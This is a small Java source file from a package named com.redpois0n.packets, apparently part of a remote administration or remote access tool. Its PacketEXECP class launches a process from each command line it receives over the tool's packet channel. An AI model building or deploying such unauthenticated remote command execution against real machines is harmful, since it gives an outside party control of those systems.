package com.redpois0n.packets;

import com.redpois0n.LaunchProcess;

public class PacketEXECP extends Packet {

	@Override
	public void read(String line) throws Exception {
		new LaunchProcess(line).start();
	}

}
